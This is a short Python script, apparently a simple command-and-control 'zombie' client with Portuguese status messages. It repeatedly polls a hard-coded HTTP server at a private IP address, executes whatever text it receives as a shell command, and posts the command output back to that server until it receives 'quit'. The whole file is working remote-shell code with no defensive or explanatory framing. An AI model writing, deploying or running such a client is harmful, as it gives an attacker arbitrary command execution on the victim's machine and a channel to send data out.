import requests
import subprocess
import time

_url = 'http://192.168.0.32:8080'

while True:
    print(f"Conectando para ser um zumbi de {_url}")
    req = requests.get(_url)
    command = req.text

    if 'quit' in command:
        break

    else:
        try:
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
            out, err = p.communicate()
            post_response = requests.post(url=_url, data=out)
        except Exception as e:
            print(f"=( {e}")
